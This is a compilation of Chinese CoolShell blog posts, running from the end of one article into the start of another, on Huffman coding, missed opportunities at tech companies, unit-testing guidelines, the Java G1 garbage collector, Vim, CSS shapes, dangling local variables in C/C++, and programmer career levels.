8\. 我知道你不喜欢商人。我也知道为什么。他们销售那些你做不到的，他们承诺那些你完不成的。他们要求的比他们付出的更多。但是，没有他们，我们可能没有办法把商业转换成产品。这是一件很难的技能。把你的想法告诉我，我愿意成为你和他们间的缓冲。要建造一个好的团队，我们需要的所有的东西。9\. 作为一个工程师，热爱你的专业。你能拥有一个可以挣钱、受人尊重、并拥有乐趣的程序员人生。你觉得怎么样？# Huffman 编码压缩算法作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn前两天发布那个rsync算法后，想看看数据压缩的算法，知道一个经典的压缩算法Huffman算法。相信大家应该听说过 David Huffman 和他的压缩算法—— Huffman Code，一种通过字符出现频率，Priority Queue，和二叉树来进行的一种压缩算法，这种二叉树又叫Huffman二叉树 —— 一种带权重的树。从学校毕业很长时间的我忘了这个算法，但是网上查了一下，中文社区内好像没有把这个算法说得很清楚的文章，尤其是树的构造，而正好看到一篇国外的文章《A Simple Example of Huffman Code on a String》，其中的例子浅显易懂，相当不错，我就转了过来。注意，我没有对此文完全翻译。
我们直接来看示例，如果我们需要来压缩下面的字符串：**“beep boop beer!”**首先，我们先计算出每个字符出现的次数，我们得到下面这样一张表 :字符 | 次数   ---|---   ‘b’ | 3   ‘e’ | 4   ‘p’ | 2   ‘ ‘ | 2   ‘o’ | 2   ‘r’ | 1   ‘!’ | 1然后，我把把这些东西放到Priority Queue中（用出现的次数据当 priority），我们可以看到，Priority Queue 是以Prioirry排序一个数组，如果Priority一样，会使用出现的次序排序：下面是我们得到的Priority Queue：接下来就是我们的算法——把这个Priority Queue 转成二叉树。我们始终从queue的头取两个元素来构造一个二叉树（第一个元素是左结点，第二个是右结点），并把这两个元素的priority相加，并放回Priority中（再次注意，这里的Priority就是字符出现的次数），然后，我们得到下面的数据图表：同样，我们再把前两个取出来，形成一个Priority为2+2=4的结点，然后再放回Priority Queue中 :
继续我们的算法（我们可以看到，这是一种自底向上的建树的过程）：最终我们会得到下面这样一棵二叉树：此时，我们把这个树的左支编码为0，右支编码为1，这样我们就可以遍历这棵树得到字符的编码，比如：‘b’的编码是 00，’p’的编码是101， ‘r’的编码是1000。 **我们可以看到出现频率越多的会越在上层，编码也越短，出现频率越少的就越在下层，编码也越长** 。最终我们可以得到下面这张编码表：字符 | 编码   ---|---   ‘b’ | 00   ‘e’ | 11   ‘p’ | 101   ‘ ‘ | 011   ‘o’ | 010   ‘r’ | 1000   ‘!’ | 1001这里需要注意一点，当我们encode的时候，我们是按“bit”来encode，decode也是通过bit来完成，比如，如果我们有这样的bitset “1011110111″ 那么其解码后就是 “pepe”。所以，我们需要通过这个二叉树建立我们Huffman编码和解码的字典表。这里需要注意的一点是，我们的Huffman对各个字符的编码是不会冲突的，也就是说， **不会存在某一个编码是另一个编码的前缀** ，不然的话就会大问题了。因为encode后的编码是没有分隔符的。
于是，对于我们的原始字符串 beep boop beer!其对就能的二进制为 : 0110 0010 0110 0101 0110 0101 0111 0000 0010 0000 0110 0010 0110 1111 0110 1111 0111 0000 0010 0000 0110 0010 0110 0101 0110 0101 0111 0010 0010 0001我们的Huffman的编码为： 0011 1110 1011 0001 0010 1010 1100 1111 1000 1001从上面的例子中，我们可以看到被压缩的比例还是很可观的。作者给出了源码你可以看看（ C99标准） Download the source files（全文完）# 科技公司十大最愚蠢的错误作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn!Facebook in Yahoo's rear-view mirror有一些史上最大的高科技公司的交易没有发生。有一些最有前途的产品和服务也没出现。为什么？因为这其中的人和公司当时都没有意识到是什么样的东西滑过了他们的手指，或者，他们只是简单地不能预知未来会发生什么。
如果事情还能再来一次，也许今天我们就不会看到Apple和Microsoft了，而且，Yahoo可能会成为世界上最大的搜索引擎，Google只能成为后者。你也许只能从施乐电脑上读这篇文章，从RealPod上听你最喜欢的频道。人们都说“事后诸葛亮”（ hindsight is 20-20，20/20是最好的视力），如果真是这样的话，那么，我们的分析就是最精确的。下面是我们挑选的历史上十大科技类公司丢失机会的案例。## 1\. Yahoo 错过 Facebook2006年，当时只有2年的Facebook还在只服务于一些学校内的社交网络。那个时候的MySpace就拥有了1亿用户，完全超过了Facebook的8百万用户。所以，当 Yahoo 提出使用10亿美金购买 Mark Zuckerberg 的孩子 时（其将近 2005年 Rupert Murdoch 收购 MySpace 金额的两倍）人们都对说Fackbook的老大说，“Take the money and run, Mark。”，事实上，时年23岁的扎克伯格也的确于2006年6月与雅虎达成了协议。然后，Yahoo发布了一些其糟糕的财政报告后，它的股价在一晚上就下跌了22%，当时Yahoo的CEO， Terry Semel，把购买价格下调到了8亿美金来购买Facebook，但被Mark Zuckerberg 拒绝，两个月后，Terry Semel 把收购价格提高到10亿美金，但那时已经太晚了。
今天，Facebook已经扩大到了2亿5千万的注册用户，并且，它目前 值大约从 50亿美金 到100亿美金间的一个价格 （主要看谁来计算） 。而我们的Yahoo三年过去了，换了两个CEO，今天还在生存线上挣扎。## 2\. Real Networks 丢弃 iPod!Tony Fadell, inventor of the iPod人们以为Steve Jobs 发明了iPod，但实际他没有，这是真的。Steve Jobs 只不过对一个因为Real Network没有采纳想法的而离职的工程师Tony Fadell 说了“Yes”，而这个想法就是2000年秋天的一种全新音乐播放器（Tony Fadell 以前的同事 Philips 同样拒绝了Tony的这个新想法）。虽然 MP3 播放器已经出现很多看了，但是 Fadell 的理念 有一些小小的不同，他注重的是：更小，更精巧，并且专注于一个音乐的内容系统，这样，能够让音乐爱好者们很容易的填满他们的播放器——“pods” （Steve Jobs 则是最著名的驱动 iPod设计的人）今天，那个专注于音乐内容的系统叫iTunes，并且，Apple公司控制了80%的数字音乐的市场。 Fadell 在Apple的 iPod 事业部工作，不过最终于2008年11月离开了那里。Real Networks 今天还在继续他的流媒体，但它的利润已被被iTunes冲得肢离破碎了。（照片是Tony Fadell)
## 3\. 索尼和东芝HD 的纷争!HD DVD versus Blu-ray为了争夺一个新的 高清晰光盘标准，几年来，在格式上的这场争夺战中，参与者各方已付出了很昂贵的成本。在拳击台上的一角落里，站着Sony支持的蓝光（Blu- ray），而另一个角落，站着Toshiba支持的 HD DVD。自从2002 开始，双方就开始争夺不休，各自的所签署的联盟阵营也只支持自己的互不兼容的格式。在2008 年，Sony 的刀刃插入了Toshiba的胸膛，让Toshiba停止了HD DVD的生产，2009年8月12日宣布正式加入蓝光阵营，Toshiba 反而成了蓝光这边最大的一个支持者之一， 华纳兄弟也花费了4亿美金宣布放弃HD DVD并加入蓝光阵营。有趣的是，在上世纪90年代中期，这对冤家同样为电影的HR格式争斗，那个时候，当时双方搁置争议，把两边的最好的东西整合起来，成为了一个叫做 Digital Versatile Disc的东西，被人们简称DVD。这样一个事情，让多年参与HD格式之争的公司门损失惨重。如果在2002年，两边联手，HD光盘可能会在今天的电影和电视节目光盘中占有统治地位，然而，双方的争斗导致了成本的上升，和在市场上错失良机，今天，DVD卖得比蓝光还要多，基本上是10:1的样子，但是未来将会属于流媒体的视频点播。
## 4\. Digital Research：另一个Microsoft!Gary Kildall, Digital Research这是一个经典案例。在 1980 年，当时的IBM正在寻找一些人为IBM的PC机做一个操作系统，当时的 Microsoft 并不是第一选择。当初的比尔·盖茨(Bill Gates)建议IBM与Digital Research的加里·基尔代尔(Gary Kildall)合作，后者也是 CP/M 操作系统的作者。传说，Kildall甩了IBM要单飞。但实际上是kildall接了另一个客户的订单去做另一个产品，仅让他自己的妻子和IBM谈判。 Dorothy Kildall ——他的妻子并不喜欢IBM的一些条款，所以和IBM的合作也流产了。蓝色巨人只好回头找了Bill Gates和他的搭档Paul Allen，他们开发了MS-DOS，这是基于 Tim Paterson 的 QDOS （全称是the Quick and Dirty Operating System）, QDOS则是基于Gary Kildall的CP/M操作系统。 最后IBM提供了 Microsoft 的 DOS (售价$60) 和某版本的CP/M (售价$240) 给IBM PC的买家做选择，最后，便宜的产品获得了胜利。
在DOS以前，Microsoft 最大的产品是 BASIC 编程工具。而在 DOS以后，是的，你知道这个公司干了什么。Microsoft 今天的成就是否和IBM的那个合同有关？我们永远也无法知道。也许，像Bill这样的人始终都能把握住这样的机会，而Gary则不能。## 5\. Xerox 错失 Alto 良机!The Xerox Alto \(Courtesy of Wikimedia\)这也是另一个经典的故事。二十年前，在Macintosh 和Windows PC之前，甚至在MITS Altair之前，已经存于 Alto，这是这个世界上第一个基于窗口图形界面的电脑（关于图形化的操作系统，大家可以看看这篇文章《操作系统图形界面发展史(1981-2009) - 1,632 次浏览")》）， 由Xerox PARC发明， Alto 有鼠标，支持以太网络，以及所见即所得的WYSIWYG文本处理器。但是1973 年的“个人电脑”市场并不存在，所以 Xerox 并不知道Alto的潜力，也不知道如何处理它。这个公司制造了几千个这要电脑并把它们分发到了各个大学中。江湖上传闻，1979年的时候，当 Steve Jobs 参观Xerox PARC的时候，看到了Alto，回去后，把那些 许许多多的 Alto 的特性 集成到了 Apple 的 Lisa 和Mac 电脑上。从那以后， Xerox 终于意识到了它的错误，然后把开始了 Xerox Star 的市场营销，Xerox Star是一个图形工作站，其基于Alto的技术。但是已经太晚了，太晚了。
## 6\. 唱片业的一错再错!Napster logo也许，没有哪个产业比音乐产业更能错过机会。在1999年，Shawn Fanning 的 Napster 创造了一个难以置信的一个让大容易共享音乐的在线平台。然后， 唱片公司们开始集体控诉Napster ，侵害了他们的版权。然后，Napster 的 CEO Hank Barry 提倡音乐产业 采用那种电台广播的许可证协议 ，对通过网络传播音乐的人征收版税，可是他的这个倡议遇到了聋子的耳朵——无人响应。于是，Napster 的粉丝们非常快地跑到了其它的P2P的文件共享网络，如Gnutella 和Grokster，于是盗版音乐也成了RIAA（美国唱片业协会）的头号敌人。在2000年，MP3.com 启动了一个服务可以允许会员们上传歌曲到自己的私有的CD收集中，并且可以以流的方式传播到每一个PC上。再次， 唱片行业控告 MP3.com 侵权， 最终导致了 MP3.com 被迫出售，并被迫更改了其商业模式。再加上 RIAA 对 Grokster, Morpheus, Kazaa, 和其它30,000 盗版单曲的指控，其它唱片行业损失了很多商业机会。
当然，今天的音乐订阅业务和流媒体服务，诸如 Pandora 支配了数字音乐界，唱片公司也开始和网络公司签了协议。试想一样，如果唱片公司们和 Napster， MP3.com，或是其它一些网络共享者合作，而不是去指控他们，也许，这些唱片公司今天将会控制着数字音乐——而且不会有任何盗版的问题。## 7\. Compuserve 错过了主宰网络的机会!CompuServe logo看看今天的交互式应用，社区媒体式的，用户原创内容驱动式的（UGC），你看到了什么？一个1994年几乎完美版本的 CompuServe。但是，几乎主宰在线世界的 CompuServe 的屁股被AOL仅以AOL有500亿的免费CD踢得开了花。在上世纪90年代初， Compuserve Information Service 有着“令人难以置信的优势：一个坚定的客户基础，难以置信的对客户的使用模式分析的数据，一个难以复制的知识仓库，几乎没有竞争的环境”， Kip Gregory，一个管理顾问， Winning Clients in a Wired World 一书的作者，说，“可能缺少的是……把这些优势都转变成可持续的领先的投入”。
于是，AOL 来了，提供了一种“不限时的”统一费用，而 CompuServe 则是按小时充值，AOL提供了一个简单的界面，以及大规模，地毯式轰炸营销活动——为每位用户提供一张免费的CD。在CompuServe论坛上早期出现的组织纷纷转到了AOL的Web上，而CompuServe论坛对Web支持的不是很好。1997年，AOL 获得了 CompuServe, 并且，“CompuServe classic” 服务最终在同年6月安息了 。CompuServe 失败不是错过了一个机会，而是错过了一堆， Gregory说，“我真的相信 CompuServe是一个非常重要的示例，这也是一个非常重要的教训——永远不要因为优势就裹足不前”。## 8\. 报业错过网络分类广告业务–Craigslist!Craigslist.org报纸正在死亡，并且，几乎的所有的帐户（当然，所有的报纸帐户）， Craigslist 的的触角却延伸到各个地方的触角却延伸到各个地方，甚至可以在所有的犯罪现场被找到。 大家认为报纸的衰落是因为在线的免费的分类广告服务，这让很多行业的利润都极大的缩水，其中一个就是新闻报纸行业的那些“现金牛”(指现金净收入极大的项目,如沃尔玛超市)。
2005年，全美报业分类广告的年收入总额为173亿美元。。从那以后，像Craigslist 这样使用分类广告的网站（如：Amazon, eBay, 和Google）几乎番了一番，根据 Pew研究中心的报告，报业的分类广告的利润却减少了一半。如果回到2005年，那段报业分类广告利润很高的时候，如果某个报业集团收买了Craigslist，那么今天可能会非常地不一样。当然，首先他们将不得不说服Craigslist的创始人Craig Newmark出售。在2008 年1月InfoWorld的采访中，Newmark 说他的公司的角色在报纸行业瓦解中被报纸行业大大地夸大了，“我认为报纸最大的问题是需要去检查他们自己”他注解道。## 9\. Google 之前的 Google!Open Text, an early search engine在上世纪90年代中期，最热的搜索引擎不是Yahoo，不是 Alta Vista，不是 Lycos，也不是 Hot Wired，而是Open Text Web 索引。它和今天的Google 非常像，Open Text 以其速度，准确性和全面性著称，这个搜索引擎于1995 年由Open Text 公司宣称，其索引了当时Web上大约5百万个页面上的每一个单词 。那年 Yahoo 在其目录中集成了Open Text 的搜索技术。
但是其和Yahoo合作两看后， Open Text 放弃了搜索而转移到企业级的内容管理方向上。一年以后，Google 才初次登场。Open Text又是和机遇错过了，没有意识到搜索会变得有多大。“如果 Open Text 有什么事是比较特殊的，那就是他们比任何人都有和Google很相近的技术”， Steve Parker（一个帮助Yahoo启动Open Text搜索技术的通讯顾问）说， “它比Google早三年进入市场，所以Google不得不为了以更快的速度发展而使劲烧钱，并且，Google也不一定有足够的时间去成为市场的领导者。如果当初不是那样，也许，今天的山大王将会是Open Text ”。## 10\. Microsoft 拯救正在腐烂的苹果!Early Apple logo10年前，当Apple正处理严重的危机中。 Mac 的销售正在被Power Computing 和 Radius更便宜的山寨机复制时。整个公司动作在非常低的现金流中，苹果的股票跌到每股$5，并且，他们正在寻找新的CEO来取代 Gil Amelio。后来，Apple 收到了一大笔急需的现金注入——1亿5千万美金——从一个看上去不可能的源头： Microsoft，还承诺继续开发Mac Office 套件。这个交易由Apple的顾问Steve Jobs 和Microsoft商议而成，这一宣布曾经在Macworld Expo 博览会上被苹果的铁杆粉丝们暴以嘘声。这后，Steve Jobs成为了Apple的实习CEO。后面，我们都知道发生了什么。
如果Microsoft 当时没有 错过让苹果凋谢的这个机会？我们可能会要在WinPhones上使用WinTunes而苦苦挣扎。在线的音乐和视频可能会停滞，或是更坏，被好莱坞控制着。而且，我们会因为没有Windows的另一个选择而长期地失望下去。这恐怕是唯一一个大家受益的“失误”了。!A young Steve Jobs   年青的Steve Jobs文章：来源（PCWorld）# 一些单元测试的Guideline作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cnJimmy Bogard 曾经写过一篇文章： 《从单元测试中获益》，这这篇文章中给出了下面三条规则：1. “ **测试名应该从用户的角度描述是什么和为什么** ” – 这样一来，程序员可以从名字就可以知道用户需要什么样的软件行为。   2. “ **测试也是代码，同样也需要我们更多的爱** ” – 真实运行在生产环境下的代码不仅仅只是我们需要去关心和花心思的代码。对于单元测试中的代码同样也需要易读易维护，以及可重用的特性。“ _我非常痛恨那些又长又复杂的测试代码，如果一个测试需要30行的单元测试代码，请把其放在一个方法中。一个长的测试步骤只会激怒程序员。如果你在正式的代码中都没有这么长的代码，那么为什么我们需要在测试代码中容忍这样的情形呢？_ ”   3. “ **不要只用一种固定的模式或组织风格** ” _–_ 有些时候，对于一些特殊的测试案例，标准的类设计模式，或一个固有的测试装置可能并不能有效的工作。
Lior Friedman 加上： “第0条 – 测试应该只测试单元其外部的行为，而不是内部的结构”。或者说，只测试对一个单元的期望，而不是这个单元的构成。Ravichandran Jv 也加上了他的条例：1. 一个测试一个断言（如果可能）。    2. 如果在测试中有“if else” 的语句，请把if和else两个分支拆分成两个测试案例。    3. 如果一个测试案例中也有if else 分枝，那么这个测试案例也需要被重构。   4. 测试案例的命名代表了这种测试的类型。例如：TestMakeReservation() 和TestMakeNoReservation()是不一样的类型。Charlie Poole，NUnit的作者，重述了“一个测试一个断言”成“一个逻辑断言Logical Assert” – 他说， “有时候，因为我们测试API的表现不足，你需要写多个物理的Assert才能达到一个完整的结果。许多使用NUnit框架API进行单元测试的开发，很不可能只使用一个Assert就完成了一个测试”。Bryan Cook 也提供了一个不错的可供考虑的列表：1. 做到：对Fixture一致地命名   2. 做到：使用namespace   3. 做到：测试方法的命名和Setup/TearDown 一致   4. 考虑：分离你的测试和开发代码   5. 做到：测试的命令和被测试的功能一致   6. 考虑：使用”Cannot” 前缀命名期望的异常
Bryan 有超过 一打的建议。最后，有些人建议大家读一下 Gerard Meszaros的书： “xUnit Test Patterns: Refactoring Test Code”文章：链接# G1新型垃圾回收器一瞥作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn目录* G1垃圾回收器   * 属性   * 描述   * 使用 G1   * 状态   * 相关资源#### G1垃圾回收器“G1垃圾回收”的英文全称是 _Garbage-First Garbage Collector_ （又被称作G1 GC），这是一个新型的垃圾回收器，由JDK 7中的Java HotSpot VM 引入。这个技术曾经在Java SE 6 Update 14版本中出现过一个试验性的，然后 G1 被 HotSpot的 反应快速（low-latency）的 _Concurrent Mark-Sweep_ GC （简称 _CMS_ ）长期取代。#### 属性G1 是一个“服务器风格（server-style）”的垃圾回收器，它主要有下面的这些属性：* **并行和并发。** G1 可以从今天最新的硬件中获得并行的能力。它能够使用所有可用的CPU（CPU多核，硬件多线程，等）来加速它的 “stop-the-world” 机制（这个机制简称STW，即，在执行垃圾收集算法时，Java应用程序的其他所有除了垃圾收集帮助器线程之外的线程都被挂起）。   * **分代处理。** 就像其它的HotSpot 垃圾回收器，G1 是分代的，也就是说，它在处理新分配的对象（年轻代）和已经生存了一段时间的对象（年老代）时会不同，它会更多地考虑一些新创建的对象实例，因为越新创建的就越有最大的可能性被回收，老对象只是偶尔访问一下。对于大多数的Java应用来说，这个机制可以极大地提高回收效率。   * **紧凑内存（碎片整理）。** 不像CMS，G1 会对堆进行内存整理。压缩可以消除潜在的内存碎片的问题，这样程序就可以更长时间的平滑运行。   * **预见性的。** G1 比起 CMS 来有更多的预见性。这个主要还是用来消除内存碎片的问题。内存的碎片少了，Stop-the-World的暂停时间也会被减少。
#### 描述比起其它的HotSpot 垃圾回收器来说，G1 使用了一种非常不同寻常的方法来管理堆内存的布局。在G1中，在对象新生代和老一代上没有在物理上把他们分隔开来。取而代之的是，它把一个连续的堆内存拆分成了几个相同大小的区域。新产生的对象和老的对象都会被放在一系列可能不会连续的区域中。之所以这样做，就是为了让G1可以更灵活地移动老对象所占用的资源给新的对象。G1中的内存收集会发生 “疏散暂停”，当内存从一系例区域开始回收时，这些区域所引用的 _collection set_ 会被疏散到另一些区域中，这样，我们会有一整块的内存来重新被申请。疏散会发生整个程序的暂停，但“疏散”这些内存可以被并行运行，当然，你要有多核或多线程技术来支持。绝大多数的“疏散暂停”会去收集那些可用的比较新的内存区域，因此，这和其它的 HotSpot 垃圾回收器是相同的。偶而才会去查看一下老区域中的内存是否可以回收。在 CMS中，其周期性的执行一个 _concurrent marking phase_ 。 这个phase中最主要的事情是，识别哪些老的区域中充满了可以回收的对象，因为这是最有效率和最合适的回收。但在G1中，G1不会执行那个所谓的 _concurrent sweeping phase_ ， 取而代之的是，去识别那些的最合适的老的区域是在并发的“疏散暂停”中进行的（后面会做介绍）。
#### 使用 G1G1 目前仍然还在试验阶段，使用下面两个参数可以打开G1机制：`-XX:+UnlockExperimentalVMOptions -XX:+UseG1GC`下面是设置垃圾回收器的暂停时间：`-XX:MaxGCPauseMillis =50` (设置暂停时间为 50ms)在G1中，你还可以给垃圾回收器的暂停设置一个时间间隔：`-XX:GCPauseIntervalMillis =200` (设置暂停时间间隔 200ms)注意，上面的两个参数只是代表目标，回收器并不保证。他们可能在某些情况下工作地很好，也可能在其它情况下不行，所以，垃圾回收器并不总是服从这两个参数设置。另外，新生代的内存大小可以被设置，这个参数同样会影响“疏散暂停”的时间：`-XX:+G1YoungGenSize=512m` (设置新生代内存为 512兆字节)G1 同样可以使用survivor 空间，是的，这就是多少个区域。大小可以由通用的参数所指定(如： `-XX:SurvivorRatio=6`).最后，如果你要发挥G1的所有潜能，你可以尝试设置下面两个参数，它们默认上是关闭的，因为在一些很稀有的情况下，这两个参数会发生race condition（竞争条件）:
`-XX:+G1ParallelRSetUpdatingEnabled   -XX:+G1ParallelRSetScanningEnabled`还有一件事是G1能够报告比其它垃圾回收站更详细的信息，当然，你需要设置下面这个参数：`-XX:+PrintGCDetails`这个参数会输出很多有用的信息供你查看性能与以 trouble-shooting。如果你想要简单的日志，你可以把这个开关设置到 `-verbosegc` 。#### 状态G1 开发目前主要关注于解决一些残留的稳定性的问题，以及提高性能，并且去除下面的限制：* G1 并不完全支持 JVM Tool Interface (JVM TI) 或 Java Management Extensions (JMX)，所以，这些监控和管理工具无法正确地作用于G1。   * G1 不支持增量的永生代collection。如果一个应用在卸载很多的类，因些需要很多的永生代Collection，目前的G1还不支持，不过最终版会支持。   * 关于垃圾回收器的暂停时间，G1的表现比起CMS来说是时好时坏。所以，还有很多工作需要让G1的表现更加稳定，绝不能比CMS还差，不然G1还有什么意思呢？
#### 相关资源* Description of HotSpot GCs: Memory Management in the Java HotSpot Virtual Machine White Paper: http://java.sun.com/j2se/reference/whitepapers/memorymanagement_whitepaper.pdf   * The original CMS paper: Printezis, T. and Detlefs, D. 2000. A generational mostly-concurrent garbage collector. In _Proceedings of the 2nd international Symposium on Memory Management_ (Minneapolis, Minnesota, United States, October 15 – 16, 2000).  (requires access to ACM’s portal)   * The original G1 paper: Detlefs, D., Flood, C., Heller, S., and Printezis, T. 2004. Garbage-first garbage collection. In Proceedings of the 4th international Symposium on Memory Management (Vancouver, BC, Canada, October 24 – 25, 2004).  (requires access to ACM’s portal)   * G1 talk from JavaOne 2008: http://developers.sun.com/learning/javaoneonline/j1sessn.jsp?sessn=TS-5419&yr=2008
文章：来源# 给程序员的VIM速查卡作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn前几天酷壳发布过“vim简明攻略”，不知道大家练得怎么样了。如果你练了一下，那么这里这个速查卡就会对你有帮助了。以前本站也有过一个（vim速查卡），不过其太简单了。我觉得这个很不错，很全，很直观。这个速查卡来自 **这里** 。其用颜色标注了级别：* Green  = 存活级   * Yellow  = 感觉良好   * Orange  / Blue = 高级   * Red  = 专家级下面的图片点击可以看大图：!给程序员的VIM速查卡给程序员的VIM速查卡（点击看大图）你还可以下载PDF版的和Excel版的，如果你是色盲的话，还有蓝色版PDF的。如果你不是很喜欢的话，这里还有几个：*    *    *    *# 神奇的CSS形状作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn【感谢 Neo 投递本文 – 微博帐号：@_锟_ 】在StackOverflow上有这么一个问题，有位同学在http://css-tricks.com/examples/ShapesOfCSS/
找到一些使用CSS做的形状，其中一位同学对下面的这个形状充满了疑问。形状是：代码是：这位同学就提问啦，为啥这么这么几句就能画出一个三角形呢？   于是呢，有高人出现，这个高人图文并茂的解释了这个三角的成因首先呢，我们需要了解HTML标记的Box Model（盒模型），这个例子中呢我们将content，padding都看作content。忽略掉margin。那么一个盒模型就是下图中间是内容，然后是4条边。每一条边都有宽度。   根据上面CSS的定义，没有border-top（顶边）的情形下 ,我们的图形如下：width设置为0后 ，内容没有了就成为下图：height也设置为0，只有底边了。然后两条边都是设置为透明，最后我们就得到了这个属于奇技淫巧，但是也说明CSS的强大，没有做不到只有想不到。另外http://css-tricks.com/examples/ShapesOfCSS/ 还能找到很多其他的形状，感兴趣的同学可以自己去看。还有酷壳以前的这篇文章《CSS实现的各种形状》# 在函数外存取局部变量的一个比喻作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn
在StackOverflow上一这样一个关于C/C++的问题，问问题的人给了一个代码如下：你可以编译并运行这个代码（编译时会有一个Warning），结果是：5 8。看上去你可以存取一个函数内的局部变量。但这和我们理解的不一样——函数内的变量在函数退出时就被释放了，不应该在外部还可以被引用。当然，对于C/C++熟悉的人都知道其实并不是真正的释放，你依然还可以通过内存地址去进行操作，这是C/C++的内存管理的不安全性——指针可以用来乱指。这个问题的解答是比较简单的，但是这个问题有一个答案中的比喻非常精彩。这个比喻是这样的——你在某个酒店订了一个房，你入住的时候，你放了一本书在这个酒店的抽屉里，但是你走的时候，你忘了这本书。而且，你还没有把这个房间的钥匙还回去。于是，你在未来某个时候，偷偷地回来，打开这个房间的门，你看到了你的书还在里间。当然，还还可以放回别的书。因为，这个酒店管理不会在你走的时候把你留下的书清走，而且，这个酒店的管理的安保措施不是那么严格，因为他信任每一个客人都会遵守管理条例。在这种情况下，如果你幸运的话，书还会在那里，也可能你的书已经没了。也有可能当你回去的时候，有一个人在那里正在撕你的书，或者酒店把那个抽屉都挪走并变成衣柜，或是整个酒店正在被拆除以改成了一个足球场，而你偷偷摸摸进到施工现场的时候被炸死。
真是很精彩的比喻。这就是C/C++的不安全的地方，也正是Linus说的，C++是一门恐怖的语言是因为有很多不合格的程序员在使用它。就像你看到小孩子玩火一样的恐怖。关于这个事，还有一个比较经典的示例如下—— 函数a的初始化会影响函数b的数组。注意函数a中的 `volatile `关键字。真是可爱的C/C++。# 程序员的八个级别作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn!programmer在面试时，你可能会被经常问到“在未来5年，你想干什么？”，这可能是一个比较难回答的问题。在中国，答案一般可能会是Team leader，Manager，或是Architect，Specialist等，在中国，大家可能更多地觉得manager会是程序员的下一个目标，可是在国外，经理和程序员可能是两个不同的分支，Architect或Specialist 比经理来说更牛、代遇可能也更好，因为这些人的智商需要的更高。在著名的“Coding Horror”上出现了这样一篇文章，我把其转到这里（我并没有完全一模一样的翻译，我只不过是用自己的话转述罢了），也让大家看看国外人的思考方式（当然，这篇文章只是分析程序员的级别而不是工种）。正如其作者结尾时所说，这八个级别并不是很严格的，其只不过是一种想法，希望能给大家另一种思路。
**第八级 不朽的程序员**这一级别是程序员的最高级别。你的代码比你的生命活的还长，当你死后，你将会成为整个历史的一部分。其它程序员对你顶礼膜拜，或许你会获得计算机最高奖“图灵奖”，不然就是一系列极其影响力的论文，再不然，就是发明了一些可以影影响整个编程界根基的技术。你拥有的不仅仅是在维基百科上的一个词条，还会有一个专门的网站来研究你的生平和你的工作成果。比如：Dijkstra, Knuth（编程艺术的作者）, Kay**第七级 成功的程序员**这类程序员一方面很著名，另一方面在商业上也很成功，他们影响了整个工业界。他们似乎决定了工业界中发展的方向，这些人，自己的编程能力固然了得，但估计他们的Business方面的能力应该大于他们编程的能力。（我个人认为Linus应该属于这一类）比如： Gates（比尔盖茨）, Carmack（Doom和Quake 3D游戏）, DHH （Ruby on Rail的创建者）**第六级 著名程序员**这一类的程序员，在编程圈子内比较有名气，但是他们的这种名气并不一定能给他们带来某种利益。名气是一件好事，但是成功可能更好一些，这类人一般正在给一个很著名的大的公司，或是是一极具影响力的小公司里工作，或者正在创建自己的事业。无论怎么样，其它的程序员听说过你的名字，并以你为榜样在效仿着你。
**第五级 骨干程序员**这类程序员一般来说都是公司里的骨干份子，他们担任着公司内最重要的编程角色，在公司内部，他们受到老板和其它程序员的尊敬，他们不会失业，因为他们随时都可以很容易地找到工作。他们工作过的公司都会因为他们而有所发展。**第四级 一般的程序员**这类程序员的优点在于，他们很清楚地意识到了自己可能这一辈了也无法成为一个伟大的程序员。天才只是很少的一部分人。如果这类程序员有一些商业和人员管理能力，他们也会在公司里相当的成功。“认识自我”并不简单，这并不是一般人能做到的，能够认识自己的人已经是很不错了，找到自己的长处，并像那个方向努力，一定也会很成功的。因为在公司里，并不只有程序员一种职位，经理，PM，流程，SQA，技术支持，售前，管理员，测试人员等等都可能会让这类程序员有更为广阔的天空。**第三级 业余的程序员**这类人员不管是不是计算机科班出身，基础如何，他们对编程有着特殊的爱好，他们可能会是一些很有前途的学生或实习生，也许他们可能会给开源做一些贡献（比如说提供一些语言包或是一些插件什么的），有时候，他们也会写两个小工具软件放在网上让人下载，也行有些时候就是为了玩玩而开发一些小程序而打发一下他们空闲的时间。他们完全是靠热情和承诺来编程。兴趣永远是最好的老师，也是最好的一件事，因为兴趣而引发的热情通常会让这些程序员成为“骨干程序员”。
**第二级 不知名的程序员**这一级的程序员是典型的为大众所知的程序员，他们有一定的编程能力，但并不出众，也许他们会在一家大公司里工作，只程序员只不过是他们的工作而已，并不是他们人生的全部。当然，这样的程序员也挺好的。必竟，平凡地人还是大多数，平凡地活着也没有什么错的。**第一级 糟糕的程序员**这类程序员不知道为什么就走上了编程这条路，他们甚至连最基本的编程经验和能力都没有。所有被他们碰过的事情都需要他们的同事重头再返工一遍，他们根本不就是程序员。程序员这个职位对于他们可能就是一个错误。正如原文作者所说，“这些级别并不是很严肃的，也并不是每个程序都会去思考一下自己的未来，但是这些级别可能会让你去想一想从事程序员十年/二十年/三十年后，自己可能变成什么样。”文章：来源*[W3C]: World Wide Web Consortium   *[VML]: Vector Markup Language# IBM收购Sun，这是一种什么样的精神？作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn!OFRIN-IBM-SUN-MICROSYSTEMS-20090318《华尔街日报》3月18日报导有消息说IBM要以65亿美金收购Sun（原文），虽然消息未经证实，但已引起轩然大波。据Business Joural报道，周二，Sun的股票一下子涨了68%，从之前$4.97一下涨到了$8.36，但IBM的股价下跌4%到了$89.46。
